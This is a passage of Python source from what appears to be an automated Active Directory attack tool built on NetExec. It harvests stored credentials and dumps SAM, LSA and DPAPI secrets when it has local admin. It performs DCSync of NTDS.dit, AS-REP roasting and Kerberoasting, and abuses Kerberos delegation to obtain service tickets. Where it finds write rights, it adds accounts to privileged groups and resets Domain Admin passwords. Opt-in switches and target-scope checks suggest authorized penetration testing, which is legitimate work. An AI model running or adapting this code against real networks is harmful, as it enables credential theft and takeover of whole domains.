            kb.log.exception(f"cannot snapshot existing {proto} credentials; DB intake disabled for this protocol", e)


def is_scoped_smb_echo(kb, session, proto, target, source, row, user, password, kind):
    """Recognize only the stored login row used by this exact LAPS SMB session."""
    if proto != "smb" or source is not None or target not in kb.allowed or kind != "plaintext":
        return False
    credential_ref = getattr(session, "credential", None)
    if (credential_ref is None or getattr(credential_ref, "protocol", None) != proto
            or getattr(credential_ref, "id", None) != row.get("id")):
        return False
    return any(
        cred.source == "laps"
        and cred.target_scope == target
        and cred.protocols == ("smb",)
        and cred.username.casefold() == user.casefold()
        and cred.secret == password
        for cred in kb.creds.values()
    )


def sync_db(kb, session, proto="smb", source=None, baseline_override=None, target=None):
    """PRIMARY credential feed: read everything NetExec stored into its workspace DB
    and fold new credentials / hosts / admin edges / sessions into the KB.
    """
    db = getattr(session, "db", None)
    if db is None:
        return
    host_rows = _rows(db.get_hosts())
    hostnames_by_id = {row.get("id"): str(row.get("hostname") or "").casefold() for row in host_rows}
    # Only new or changed rows are fresh evidence from this run.
    baseline = baseline_override if baseline_override is not None else kb.baseline_credentials.get(proto, {})
    try:
        for r in _rows(db.get_credentials()) if baseline is not None else []:
            fingerprint = (r.get("domain"), r.get("username"), r.get("credtype"), r.get("password"))
            if baseline.get(r.get("id")) == fingerprint:
                continue
            dom = (r.get("domain") or "").strip()
            user = (r.get("username") or "").strip()
            pw = r.get("password")
            ctype = (r.get("credtype") or "plaintext").strip().lower()
            if not user or pw in (None, ""):
                continue
            kind = "hash" if ctype == "hash" else "plaintext"
            if is_scoped_smb_echo(kb, session, proto, target, source, r, user, str(pw), kind):
                kb.log.debug("current SMB row echoes an exact target-scoped LAPS credential")
                continue
            local = (kind == "hash" and source not in ("ntds", "ntds-db")
                     and bool(dom) and dom.casefold() == hostnames_by_id.get(r.get("pillaged_from_hostid")))
            kb.add_cred(Cred(dom, user, str(pw), kind, local=local, source=source or f"{proto}-db"))
    except (Exception, SystemExit) as exc:
        kb.log.exception(f"reading credentials from {proto} DB", exc)
    # hosts (discovery) + DC flag
    try:
        for r in host_rows:
            ip = (r.get("ip") or "").strip()
            if ip:
                kb.add_host(ip, hostname=r.get("hostname"), os=r.get("os"), dc=r.get("dc"), domain=r.get("domain"))
    except (Exception, SystemExit) as exc:
        kb.log.exception(f"reading hosts from {proto} DB", exc)
    # SMB workspace relations are candidate edges until the playbook verifies
    # access in this run. Resolve database IDs without expanding target scope.
    if proto != "smb":
        return
    try:
        users_by_id = {row.get("id"): row for row in _rows(db.get_users())} if hasattr(db, "get_users") else {}
    except (Exception, SystemExit) as e:
        users_by_id = {}
        kb.log.exception("reading SMB users for relationship resolution", e)
    hosts_by_id = {row.get("id"): row for row in host_rows}
    for getter, bucket, label in (("get_admin_relations", kb.admin_edges, "adminTo"),
                                   ("get_loggedin_relations", kb.sessions, "hasSession")):
        fn = getattr(db, getter, None)
        if not fn:
            continue
        try:
            for r in _rows(fn()):
                edge = (r.get("userid"), r.get("hostid"))
                if edge not in bucket:
                    bucket.add(edge)
                    user = users_by_id.get(edge[0], {})
                    machine = hosts_by_id.get(edge[1], {})
                    domain, username = str(user.get("domain") or ""), str(user.get("username") or "")
                    principal = f"{domain}\\{username}" if domain and username else username or None
                    target_ip = str(machine.get("ip") or "") or None
                    record = {"type": label, "principal": principal, "target": target_ip,
                              "hostname": machine.get("hostname"), "in_scope": target_ip in kb.allowed,
                              "source": "smb_workspace", "user_id": edge[0], "host_id": edge[1]}
                    kb.relationship_edges.append(record)
                    kb.findings.append(f"{label} workspace candidate: {principal or f'user#{edge[0]}'} -> {target_ip or f'host#{edge[1]}'}")
        except (Exception, SystemExit) as exc:
            kb.log.exception(f"reading {getter} from {proto} DB", exc)


# --------------------------------------------------------------------------- #
# low-level NetExec helpers
# --------------------------------------------------------------------------- #
def open_session(kb, host, proto, cred, *, fresh=False):
    """Open one protocol session as a credential (or anonymously), fully logged."""
    if cred is not None and cred.kind == "aes" and kb.kdc_host not in kb.allowed:
        kb.log.warn("Kerberos credential skipped: --kdcHost must exactly match an allowed target")
        return None
    if cred is not None and cred.kind == "ccache" and (host.target != cred.target_scope or cred.kdc_host not in kb.allowed):
        kb.log.warn("Service ccache skipped: host or KDC is outside its exact allowed scope")
        return None
    if cred is not None and cred.kind == "ccache" and cred.expires_at is not None and cred.expires_at <= time():
        kb.log.warn("Service ccache skipped: delegated ticket has expired")
        return None
    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return None
    kb.steps += 1
    opts = {} if cred is None else ({"credential": host.credential(*cred.db_ref)} if cred.db_ref
                                   else cred.login_kwargs(kb.default_domain))
    if cred is None:
        opts = {"anonymous": True}
    if proto == "smb":
        # Skip NetExec's initial SMBv1 probe; the intended AD hosts support SMBv3.
        opts["no_smbv1"] = True
    if fresh:
        opts["fresh"] = True
    what = f"{proto}://{host.target} as {'anon' if cred is None else cred.label()}"

    def _connect():
        with KERBEROS_CACHE_LOCK:
            if cred is None or cred.kind != "ccache":
                return getattr(host, proto)(**opts)
            previous_cache = os.environ.get("KRB5CCNAME")
            os.environ["KRB5CCNAME"] = cred.secret
            try:
                return getattr(host, proto)(**opts)
            finally:
                if previous_cache is None:
                    os.environ.pop("KRB5CCNAME", None)
                else:
                    os.environ["KRB5CCNAME"] = previous_cache

    session, _timed = run_bounded(_connect, PROBE_TIMEOUT, kb.log, f"connect {what}")
    if session is None:
        return None
    connection = getattr(session, "connection", None)
    kb.observe_host_identity(host.target, getattr(connection, "hostname", None))
    data = getattr(getattr(session, "result", None), "data", None)
    reachable = bool(getattr(session, "ok", False)) or bool(getattr(data, "connected", False))
    # The playbook runner's ConnectionData has no is_dc field. NetExec's SMB
    # connection records its DC check on the connection object as `isdc`.
    kb.add_host(host.target, reachable=reachable, dc=getattr(connection, "isdc", None))
    if getattr(session, "ok", False):
        kb.log.info(f"{what}: ok (auth={getattr(session, 'authenticated', False)} admin={getattr(session, 'admin', None)})")
        return session
    kb.log.debug(f"{what}: not usable (reachable={reachable})")
    return None


def do_action(kb, session, name, source, domain, **opts):
    """Call one NetExec action, bound + logged + harvested. Returns the result."""
    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return None
    kb.steps += 1

    def _call():
        return getattr(session, name)(**opts)

    result, _timed = run_bounded(_call, PROBE_TIMEOUT, kb.log, f"{source}:{name}")
    if result is not None:
        harvest_events(kb, result, source, domain)
    return result


def do_module(kb, session, module_name, step_source, domain, **opts):
    """Run one NetExec module, bound + logged + harvested. Returns the ModuleResult."""
    if kb.steps >= MAX_STEPS:
        kb.budget_exhausted = True
        return None
    kb.steps += 1

    def _call():
        return session.module(module_name, **opts)

    result, _timed = run_bounded(_call, max(PROBE_TIMEOUT, 60), kb.log, f"{step_source}:module:{module_name}")
    if result is not None:
        if module_name == "laps":
            harvest_laps_result(kb, result, domain)
        else:
            harvest_events(kb, result, f"{step_source}:{module_name}", domain)
    return result


# --------------------------------------------------------------------------- #
# technique groups (the decision tree's leaves)
# --------------------------------------------------------------------------- #
def record_live_host_relationships(kb, host, cred, result):
    """Keep current WKSSVC/SAMR observations distinct from workspace history."""
    if (result is None or not getattr(result, "ok", False) or host.target not in kb.allowed
            or result.protocol != "smb" or result.target != host.target):
        return
    data = getattr(result, "data", None)
    observer = cred.principal() if cred else "anonymous"
    records = []
    if result.action == "loggedon_users":
        for user in getattr(data, "users", []) or []:
            domain, username = str(getattr(user, "domain", "") or ""), str(getattr(user, "username", "") or "")
            if domain and username:
                records.append({"type": "hasSession", "principal": f"{domain}\\{username}",
                                "target": host.target, "logon_server": getattr(user, "logon_server", None),
                                "in_scope": True, "source": "smb_wkssvc", "observed_by": observer,
                                "observed_in_run": True})
    elif result.action == "local_groups" and getattr(data, "members_queried", False):
        groups = getattr(data, "groups", {}) or {}
        if any(str(name).casefold() == "administrators" and int(rid) == 544 for name, rid in groups.items()):
            for sid, name in (getattr(data, "members", {}) or {}).items():
                if str(sid).startswith("S-") and name:
                    records.append({"type": "localAdminMember", "principal": str(name),
                                    "principal_sid": str(sid), "target": host.target,
                                    "local_group": "Administrators", "local_group_sid": "S-1-5-32-544",
                                    "in_scope": True, "source": "smb_samr", "observed_by": observer,
                                    "observed_in_run": True})
    added = 0
    for record in records:
        if record not in kb.relationship_edges:
            kb.relationship_edges.append(record)
            added += 1
    if added:
        kb.findings.append(f"observed {added} {result.action} relationship(s) on {host.target}; access unverified")


def smb_enumerate(kb, host, cred, session):
    source = "smb-enum"
    for name, opts in (("shares", {}), ("rid_brute", {"rid_brute": 4000}), ("pass_pol", {}),
                       ("disks", {}), ("loggedon_users", {}),
                       ("local_groups", {"local_groups": "Administrators"})):
        result = do_action(kb, session, name, source, kb.default_domain, **opts)
        if name in ("loggedon_users", "local_groups"):
            record_live_host_relationships(kb, host, cred, result)
    if ENABLE_SPIDER:
        do_module(kb, session, "spider_plus", source, kb.default_domain, download_flag=True, max_file_size=SPIDER_MAX)


def smb_loot_admin(kb, host, cred, session):
    """Local-admin on this host: pull every on-host secret store we can."""
    source = "smb-loot"
    kb.log.step(f"LOCAL ADMIN on {host.target} as {cred.label() if cred else 'anon'} — looting host secrets")
    kb.admin_edges.add((cred.key() if cred else ("anon",), host.target))
    if not ENABLE_LOOT:
        kb.log.info("host secret collection skipped; set GETDA_ENABLE_LOOT=1 to enable it")
        return
    for name, opts in (("sam", {"sam": "secdump"}), ("lsa", {"lsa": "secdump"}), ("dpapi", {"dpapi": []})):
        do_action(kb, session, name, f"{name}", kb.default_domain, **opts)
    for mod in LOOT_MODULES:
        do_module(kb, session, mod, source, kb.default_domain)


def smb_dcsync(kb, host, cred, session):
    """DC + sufficient rights: dump NTDS.dit (every domain hash, incl. krbtgt)."""
    if not ENABLE_DOMAIN_SECRETS:
        kb.log.info("NTDS/DCSync skipped; set GETDA_ENABLE_DOMAIN_SECRETS=1 to enable domain-secret collection")
        return
    kb.log.step(f"Attempting NTDS/DCSync against DC {host.target}")
    before = credential_fingerprints(session.db.get_credentials()) if getattr(session, "db", None) else {}
    result = do_action(kb, session, "ntds", "ntds", kb.default_domain, ntds="drsuapi")
    if getattr(result, "ok", False):
        sync_db(kb, session, "smb", source="ntds-db", baseline_override=before, target=host.target)
    if kb.da_reached:
        kb.log.crit(f"NTDS dumped — {kb.da_proof}")


def ldap_enumerate(kb, host, cred, session):
    domain = kb.default_domain
    source = "ldap-enum"
    for name in ("users", "groups", "computers", "ous", "dc_list", "admin_count", "password_not_required"):
        do_action(kb, session, name, source, domain)
    # Descriptions and info fields can contain passwords too, so keep all
    # password-bearing LDAP attributes behind the same explicit opt-in.
    modules = []
    if ENABLE_DOMAIN_SECRETS:
        modules.extend(("user-desc", "get-info-users", "get-userPassword", "get-unixUserPassword"))
    for mod in modules:
        do_module(kb, session, mod, "ldap-fields", domain)


def ldap_host_roles(kb, session):
    """Map directory computer roles only to same-domain, explicitly allowed hosts."""
    result = do_action(kb, session, "query", "ldap-host-roles", kb.default_domain,
                       query=["(objectCategory=computer)", "dNSHostName sAMAccountName operatingSystem primaryGroupID"])
    if result is None or not getattr(result, "ok", False):
        return
    directory_domain = str(getattr(getattr(session, "connection", None), "targetDomain", None) or kb.default_domain).casefold()
    for entry in getattr(getattr(result, "data", None), "entries", []):
        names = []
        for attribute in ("dNSHostName", "sAMAccountName"):
            value = entry.get(attribute)
            value = value[0] if isinstance(value, list) and value else value
            if value:
                names.append(str(value).rstrip("$").casefold())
        os_name = entry.get("operatingSystem")
        os_name = os_name[0] if isinstance(os_name, list) and os_name else os_name
        primary_group = entry.get("primaryGroupID")
        primary_group = primary_group[0] if isinstance(primary_group, list) and primary_group else primary_group
        for target in kb.allowed:
            facts = kb.hosts.get(target, {})
            hostname = str(facts.get("hostname") or target).casefold()
            host_domain = str(facts.get("domain") or "").casefold()
            if any((name == hostname and "." in name)
                   or (host_domain == directory_domain and name.split(".", 1)[0] == hostname.split(".", 1)[0]) for name in names):
                kb.add_host(target, os=os_name, dc=str(primary_group) == str(DOMAIN_CONTROLLERS_PRIMARY_GROUP_RID))


def ldap_roast(kb, host, cred, session):
    if not ENABLE_KERBEROS_PROBES or kb.kdc_host not in kb.allowed:
        return
    domain = kb.default_domain
    asrep = kb.log.base + ".asrep.hashes"
    tgs = kb.log.base + ".kerberoast.hashes"
    do_action(kb, session, "asreproast", "asreproast", domain, asreproast=asrep)
    do_action(kb, session, "kerberoasting", "kerberoast", domain, kerberoasting=tgs)
    for path in (asrep, tgs):
        if os.path.isfile(path) and os.path.getsize(path):
            kb.roast_files.add(path)


def match_delegation_target(kb, record):
    """Resolve a service to one allowed host using identities already observed in scope."""
    spn = str(getattr(record, "spn", "") or "")
    if "/" not in spn:
        return None
    hostname = spn.split("/", 1)[1].split(":", 1)[0].split("@", 1)[0].rstrip(".").casefold()
    if "." in hostname and kb.default_domain and not hostname.endswith("." + kb.default_domain.casefold()):
        return None
    short_name = hostname.split(".", 1)[0]
    target_account = str(getattr(record, "target", "") or "")
    account = target_account.rstrip("$").casefold() if target_account.endswith("$") else ""
    matches = []
    for target in kb.allowed:
        facts = kb.hosts.get(target, {})
        if facts.get("domain") and kb.default_domain and str(facts["domain"]).casefold() != kb.default_domain.casefold():
            continue
        aliases = {str(target).rstrip(".").casefold(), str(facts.get("hostname") or "").rstrip(".").casefold(),
                   *kb.observed_hostnames.get(target, set())}
        aliases.discard("")
        if any(alias == hostname or alias.split(".", 1)[0] == short_name for alias in aliases):
            if account and not any(alias.split(".", 1)[0] == account for alias in aliases):
                continue
            matches.append(target)
    return matches[0] if len(matches) == 1 else None


def ldap_delegation(kb, host, cred, session):
    """Ingest typed LDAP edges; request a ticket only for an explicit in-scope path."""
    result = do_module(kb, session, "delegation", "delegation", kb.default_domain)
    for item in getattr(result, "results", []) if result is not None else []:
        complete = bool(getattr(item, "ok", False))
        if not complete and getattr(item, "error", None):
            kb.findings.append(f"delegation enumeration incomplete on {host.target}: {item.error}")
        for record in getattr(getattr(item, "data", None), "delegations", []) or []:
            target_host = match_delegation_target(kb, record)
            edge = {"source": record.source, "source_type": record.source_type,
                    "type": record.delegation_type, "target_account": record.target,
                    "target_host": target_host, "spn": record.spn,
                    "protocol_transition": record.protocol_transition, "complete": complete}
            if edge not in kb.delegation_edges:
                kb.delegation_edges.append(edge)
                prefix = "delegation" if complete else "partial delegation"
                kb.findings.append(f"{prefix} {record.delegation_type}: {record.source} -> {record.spn or record.target or 'any service'}")
            if not (complete and ENABLE_DELEGATION_TICKETS and DELEGATE_USER and cred
                    and not cred.local and cred.username.casefold() == record.source.casefold()
                    and (record.protocol_transition or record.delegation_type == "resource-based constrained")
                    and record.spn):
                continue
            requested_spns = [record.spn]
            if record.delegation_type == "resource-based constrained" and record.spn.casefold().startswith("host/"):
                service_host = record.spn.split("/", 1)[1]
                if "." in service_host:
                    requested_spns.append(f"cifs/{service_host}")
            for requested_spn in requested_spns:
                candidate = (cred, host.target, record, requested_spn)
                if candidate not in kb.delegation_candidates:
                    kb.delegation_candidates.append(candidate)


def issue_delegation_tickets(kb, root):
    """Recheck discovered host identities before touching an explicitly allowed KDC."""
    for cred, dc_target, record, requested_spn in kb.delegation_candidates:
        target_host = match_delegation_target(kb, record)
        if target_host is None:
            continue
        for edge in kb.delegation_edges:
            if edge["source"] == record.source and edge["spn"] == record.spn:
                edge["target_host"] = target_host
        scope = (cred.key(), requested_spn, DELEGATE_USER)
        if (scope, "delegation-ticket") in kb.done:
            continue
        dc = root if dc_target == root.target else root.at(dc_target)
        ldap = open_session(kb, dc, "ldap", cred)
        if ldap is None:
            continue
        kb.visit(scope, "delegation-ticket")
        ticket_result = do_module(kb, ldap, "delegation", "delegation-ticket", kb.default_domain,
                                  account=cred.username, user=DELEGATE_USER, spn=requested_spn)
        for ticket in getattr(ticket_result, "results", []) if ticket_result is not None else []:
            ccache = getattr(getattr(ticket, "data", None), "ccache", None)
            if getattr(ticket, "ok", False) and ccache:
                expires_at = getattr(ticket.data, "expires_at", None)
                service = requested_spn.split("/", 1)[0].casefold()
                protocols = DELEGATED_SERVICE_PROTOCOLS.get(service)
                artifact = {"source": cred.principal(), "impersonated_user": DELEGATE_USER,
                            "spn": requested_spn, "alias_of": record.spn if requested_spn != record.spn else None,
                            "target_host": target_host, "ccache": ccache, "expires_at": expires_at,
                            "protocols": protocols, "credential_queued": False}
                kb.delegation_tickets.append(artifact)
                kb.findings.append(f"delegation ticket saved for {DELEGATE_USER} -> {requested_spn}; service access unverified")
                if protocols:
                    prior_state = kb.current_state
                    kb.current_state = (cred, dc_target)
                    try:
                        delegated = Cred(kb.default_domain, DELEGATE_USER, ccache, "ccache",
                                         source=f"delegation:{cred.principal()}", target_scope=target_host,
                                         protocols=protocols, kdc_host=dc_target, expires_at=expires_at)
                        artifact["credential_queued"] = kb.add_cred(delegated)
                    finally:
                        kb.current_state = prior_state
                    if artifact["credential_queued"] and getattr(record, "delegation_type", None) == "resource-based constrained":
                        grants = [assessment for assessment in kb.acl_assessments
                                  if assessment.get("target_type") == "computer"
                                  and str(assessment.get("target_name") or "").casefold() == str(record.target or "").casefold()
                                  and (assessment.get("next_action") or {}).get("completed")
                                  and str((assessment["next_action"].get("options") or {}).get("source") or "").casefold() == cred.username.casefold()]
                        if len(grants) == 1:
                            grant = grants[0]
                            kb.credential_paths[delegated.key()].insert(-1, {"type": "rbcd_grant",
                                                                           "principal": grant["principal"],
                                                                           "source": cred.principal(),
                                                                           "host": grant["source_host"],
                                                                           "target_host": target_host,
                                                                           "target_dn": grant["target_dn"]})


def execute_group_control(kb, host, cred, session, record):
    """Try an explicitly enabled group change, then seek fresh access proof."""
    action = record["next_action"]
    if (not ENABLE_GROUP_WRITES or action is None or kb.tier_zero_reached
            or kb.hosts.get(host.target, {}).get("role") != "domain_controller"):
        return
    action["executed"] = True
    result = do_module(kb, session, "modify-group", "privileged-group-control", cred.domain,
                       **action["options"])
    items = getattr(result, "results", []) if result is not None else []
    item = items[0] if len(items) == 1 else None
    data = getattr(item, "data", None)
    action["completed"] = bool(getattr(data, "completed", False)
                                and str(getattr(data, "group_dn", "")).casefold() == record["target_dn"].casefold()
                                and getattr(data, "user", None) == cred.username)
    action["error"] = getattr(item, "error", None) if item is not None else "No unambiguous module result"
    if not action["completed"]:
        return
    kb.findings.append(f"group membership addition acknowledged: {cred.principal()} -> {record['target_name']}; access unverified")
    fresh_smb = open_session(kb, host, "smb", cred, fresh=True)
    action["verified_admin"] = bool(fresh_smb is not None and getattr(fresh_smb, "authenticated", False)
                                    and getattr(fresh_smb, "admin", None) is True)
    if fresh_smb is None:
        return
    kb.note_access(cred, host.target, "smb", fresh_smb)
    if action["verified_admin"] and kb.tier_zero_reached:
        kb.tier_zero_path.insert(-1, {"type": "group_membership", "principal": cred.principal(),
                                      "group": record["target_name"], "group_dn": record["target_dn"],
                                      "host": host.target, "module": "modify-group"})
        verify_domain_admin(kb, cred, host.target, session)


def ldap_privileged_group_assessment(kb, host, cred, session, token_data, assumed_sids, root_dn):
    """Find Tier Zero groups by SID and record conditional control paths."""
    principal_sid = str(getattr(token_data, "principal_sid", "") or "")
    if "-" not in principal_sid:
        return
    domain_sid = principal_sid.rsplit("-", 1)[0]
    target_sids = {f"{domain_sid}-512", f"{domain_sid}-519", "S-1-5-32-544"}
    search_filter = "(|" + "".join(f"(objectSid={sid})" for sid in sorted(target_sids)) + ")"
    result = do_action(kb, session, "query", "privileged-group-acl", cred.domain,
                       query=[search_filter, "objectSid distinguishedName sAMAccountName objectClass"])
    if result is None or not getattr(result, "ok", False):
        return
    token_sids = [*token_data.directory_sids, *assumed_sids]
    query_data = getattr(result, "data", None)
    entries = getattr(query_data, "entries", []) or []
    distinguished_names = getattr(query_data, "distinguished_names", []) or []
    for index, entry in enumerate(entries):
        sid = str(entry.get("objectSid") or "")
        dn = str(entry.get("distinguishedName") or (distinguished_names[index] if index < len(distinguished_names) else ""))
        name = str(entry.get("sAMAccountName") or "")
        classes = entry.get("objectClass") or []
        if (sid not in target_sids or not name or not dn or "/" in dn or "\\" in dn
                or not dn.casefold().endswith("," + root_dn.casefold())
                or "group" not in (classes if isinstance(classes, list) else [classes])):
            continue
        if not kb.visit((cred.key(), dn), "privileged-group-acl"):
            continue
        record = {"principal": cred.principal(), "source_host": host.target, "target_type": "group",
                  "target_name": name, "target_dn": dn, "target_sid": sid,
                  "decision": "unknown", "reason": "Group DACL unavailable or incomplete",
                  "directory_sids": list(token_data.directory_sids), "assumed_logon_sids": list(assumed_sids),
                  "rights": {}, "next_action": None}
        kb.acl_assessments.append(record)
        dacl_result = do_module(kb, session, "daclread", "privileged-group-acl", cred.domain,
                                target_dn=dn, ace_type="all")
        dacl_items = getattr(dacl_result, "results", []) if dacl_result is not None else []
        item = dacl_items[0] if len(dacl_items) == 1 else None
        matches = [obj for obj in getattr(getattr(item, "data", None), "objects", []) or []
                   if str(obj.get("dn") or "").casefold() == dn.casefold()
                   and obj.get("descriptor") and not obj.get("error")]
        if getattr(item, "error", None) or len(matches) != 1:
            continue
        descriptor = matches[0]["descriptor"]
        for right, mask, guid in (("WriteMembers", 0x20, "bf9679c0-0de6-11d0-a285-00aa003049e2"),
                                  ("GenericAll", 0xF01FF, None), ("WriteDacl", 0x40000, None),
                                  ("WriteOwner", 0x80000, None)):
            check = assess_dacl(descriptor, token_sids, mask, object_type=guid, target_sid=matches[0].get("sid"))
            record["rights"][right] = {"decision": check.decision, "reason": check.reason,
                                       "ace_indices": check.ace_indices}
        decisions = {right["decision"] for right in record["rights"].values()}
        record["decision"] = "candidate" if "allowed" in decisions else "unknown" if "unknown" in decisions else "denied"
        record["reason"] = "Conditional DACL assessment; no group modification or full Windows token was verified"
        if any(record["rights"][right]["decision"] == "allowed" for right in ("WriteMembers", "GenericAll")):
            record["next_action"] = {"module": "modify-group", "options": {"group": name, "group_dn": dn,
                                                                             "user": cred.username},
                                     "executed": False}
        if record["decision"] == "candidate":
            kb.findings.append(f"conditional group-control candidate: {cred.principal()} -> {name}; operation unverified")
        execute_group_control(kb, host, cred, session, record)


def execute_user_password_reset(kb, host, cred, record):
    """Reset one explicitly selected user and re-enter the credential frontier."""
    action = record["next_action"]
    if (not ENABLE_PASSWORD_RESET or action is None or kb.tier_zero_reached
            or kb.hosts.get(host.target, {}).get("role") != "domain_controller"
            or kb.password_reset_attempted
            or record["target_dn"].casefold() in kb.password_reset_targets
            or not kb.visit((cred.key(), record["target_dn"]), "password-reset")):
        return
    smb = open_session(kb, host, "smb", cred)
    if smb is None or not getattr(smb, "authenticated", False):
        action["error"] = "Fresh SMB authentication unavailable"
        return
    replacement = secrets.token_urlsafe(24)
    kb.password_reset_attempted = True
    action["executed"] = True
    result = do_module(kb, smb, "change-password", "user-password-reset", cred.domain,
                       user=record["target_name"], newpass=replacement)
    items = getattr(result, "results", []) if result is not None else []
    item = items[0] if len(items) == 1 else None
    data = getattr(item, "data", None)
    action["changed"] = bool(getattr(data, "completed", False))
    action["stored"] = bool(getattr(data, "stored", False))
    action["error"] = getattr(item, "error", None) if item is not None else "No unambiguous module result"
    smb_domain = str(getattr(getattr(smb, "connection", None), "domain", "") or cred.domain)
    credential_id = getattr(data, "credential_id", None)
    if not (action["changed"] and action["stored"]
            and getattr(data, "username", None) == record["target_name"]
            and str(getattr(data, "domain", "")).casefold() == smb_domain.casefold()
            and getattr(data, "credential_kind", None) == "plaintext"
            and getattr(data, "new_secret", None) == replacement
            and isinstance(credential_id, int) and credential_id > 0):
        return
    kb.password_reset_targets.add(record["target_dn"].casefold())
    action["credential_ref"] = {"protocol": "smb", "id": credential_id}
    action["credential_queued"] = kb.add_cred(Cred(cred.domain, record["target_name"], "",
                                                  source=f"password-reset:{cred.principal()}",
                                                  db_ref=("smb", credential_id)))
    kb.findings.append(f"password reset acknowledged for {record['target_name']}; new authentication unverified")


def assess_user_reset_entry(kb, host, cred, session, token_data, assumed_sids, root_dn, entry, dn, auto):
    """Assess one exact directory user; a proposed reset is not access proof."""
    name = str(entry.get("sAMAccountName") or "")
    classes = entry.get("objectClass") or []
    if (not name or (not auto and name.casefold() != RESET_TARGET_USER.casefold())
            or (auto and name.casefold() == cred.username.casefold())
            or not dn or "/" in dn or "\\" in dn
            or not dn.casefold().endswith("," + root_dn.casefold())
            or "user" not in (classes if isinstance(classes, list) else [classes])
            or not kb.visit((cred.key(), dn), "user-password-reset-acl")):
        return
    record = {"principal": cred.principal(), "source_host": host.target, "target_type": "user",
              "target_name": name, "target_dn": dn, "target_sid": str(entry.get("objectSid") or ""),
              "auto_selected": auto,
              "decision": "unknown", "reason": "User DACL unavailable or incomplete",
              "directory_sids": list(token_data.directory_sids), "assumed_logon_sids": list(assumed_sids),
              "rights": {}, "next_action": None}
    kb.acl_assessments.append(record)
    dacl_result = do_module(kb, session, "daclread", "user-password-reset-acl", cred.domain,
                            target_dn=dn, ace_type="all")
    items = getattr(dacl_result, "results", []) if dacl_result is not None else []
    item = items[0] if len(items) == 1 else None
    matches = [obj for obj in getattr(getattr(item, "data", None), "objects", []) or []
               if str(obj.get("dn") or "").casefold() == dn.casefold()
               and obj.get("descriptor") and not obj.get("error")]
    if getattr(item, "error", None) or len(matches) != 1:
        return
    descriptor = matches[0]["descriptor"]
    token_sids = [*token_data.directory_sids, *assumed_sids]
    for right, mask, guid in (("ForceChangePassword", 0x100, "00299570-246d-11d0-a768-00aa006e0529"),
                              ("GenericAll", 0xF01FF, None)):
        check = assess_dacl(descriptor, token_sids, mask, object_type=guid, target_sid=matches[0].get("sid"))
        record["rights"][right] = {"decision": check.decision, "reason": check.reason,
                                   "ace_indices": check.ace_indices}
    decisions = {right["decision"] for right in record["rights"].values()}
    record["decision"] = "candidate" if "allowed" in decisions else "unknown" if "unknown" in decisions else "denied"
    record["reason"] = "Conditional DACL assessment; password change and fresh authentication not verified"
    if record["decision"] == "candidate":
        record["next_action"] = {"module": "change-password", "options": {"user": name}, "executed": False}
        kb.findings.append(f"conditional password-reset candidate: {cred.principal()} -> {name}; operation unverified")
    execute_user_password_reset(kb, host, cred, record)


def ldap_user_reset_assessment(kb, host, cred, session, token_data, assumed_sids, root_dn):
    """Assess an exact user or a bounded set of nested Domain Admin users."""
    if not RESET_TARGET_USER:
        return
    auto = RESET_TARGET_USER.casefold() == "auto"
    if auto:
        principal_sid = str(getattr(token_data, "principal_sid", "") or "")
        if "-" not in principal_sid:
            return
        domain_admin_sid = principal_sid.rsplit("-", 1)[0] + "-512"
        groups = [record for record in kb.acl_assessments
                  if record.get("target_type") == "group" and record.get("target_sid") == domain_admin_sid
                  and record.get("principal") == cred.principal() and record.get("source_host") == host.target]
        if len(groups) != 1 or MAX_AUTO_RESET_TARGETS == 0:
            return
        group_dn = groups[0]["target_dn"]
        search_filter = ("(&(objectCategory=person)(objectClass=user)"
                         f"(memberOf:1.2.840.113556.1.4.1941:={escape_filter_chars(group_dn)}))")
    else:
        search_filter = f"(&(objectCategory=person)(objectClass=user)(sAMAccountName={escape_filter_chars(RESET_TARGET_USER)}))"
    result = do_action(kb, session, "query", "user-password-reset-acl", cred.domain,
                       query=[search_filter, "objectSid distinguishedName sAMAccountName objectClass"])
    if result is None or not getattr(result, "ok", False):
        return
    query_data = getattr(result, "data", None)
    entries = getattr(query_data, "entries", []) or []
    distinguished_names = getattr(query_data, "distinguished_names", []) or []
    if not auto and len(entries) != 1:
        return
    candidates = [(entry, str(entry.get("distinguishedName") or
                              (distinguished_names[index] if index < len(distinguished_names) else "")))
                  for index, entry in enumerate(entries)]
    if auto:
        candidates = [(entry, dn) for entry, dn in candidates
                      if str(entry.get("sAMAccountName") or "").casefold() not in ("", cred.username.casefold())
                      and dn.casefold().endswith("," + root_dn.casefold())]
        candidates.sort(key=lambda candidate: str(candidate[0].get("sAMAccountName") or "").casefold())
        if len(candidates) > MAX_AUTO_RESET_TARGETS:
            kb.findings.append(f"automatic password-reset assessment capped at {MAX_AUTO_RESET_TARGETS} of {len(candidates)} Domain Admin users")
            candidates = candidates[:MAX_AUTO_RESET_TARGETS]
    for entry, dn in candidates:
        assess_user_reset_entry(kb, host, cred, session, token_data, assumed_sids, root_dn, entry, dn, auto)


def rbcd_target_accounts(kb):
    """Choose computer names only from live host identities inside the allowed set."""
    if RBCD_TARGET_ACCOUNT:
        return [RBCD_TARGET_ACCOUNT]
    accounts = set()
    for target in kb.allowed:
        facts = kb.hosts.get(target, {})
        domain = str(facts.get("domain") or "").casefold()
        if domain and domain != kb.default_domain.casefold():
            continue
        for alias in kb.observed_hostnames.get(target, set()):
            if ":" in alias or re.fullmatch(r"[0-9.]+", alias):
                continue
            if "." in alias and not alias.endswith("." + kb.default_domain.casefold()):
                continue
            if not domain and "." not in alias:
                continue
            accounts.add(alias.split(".", 1)[0] + "$")
    return sorted(accounts)


def match_rbcd_target(kb, account, dns_name):
    """Require one observed, explicitly allowed same-domain host for a computer."""
    dns_name = str(dns_name or "").rstrip(".").casefold()
    short_name = str(account or "").removesuffix("$").casefold()
    if (not dns_name or not short_name or dns_name.split(".", 1)[0] != short_name
            or not kb.default_domain or not dns_name.endswith("." + kb.default_domain.casefold())):
        return None
    matches = []
    for target in kb.allowed:
        facts = kb.hosts.get(target, {})
        if facts.get("domain") and str(facts["domain"]).casefold() != kb.default_domain.casefold():
            continue
        aliases = kb.observed_hostnames.get(target, set())
        if any(alias == dns_name or (facts.get("domain") and alias.split(".", 1)[0] == short_name)
               for alias in aliases if alias):
            matches.append(target)
    return matches[0] if len(matches) == 1 else None


def execute_rbcd_control(kb, host, cred, session, record):
    """Apply an opted-in exact-object grant and keep LDAP proof separate from access."""
    action = record["next_action"]
    if (not ENABLE_RBCD_WRITE or action is None or record["target_host"] is None or kb.rbcd_grant_completed
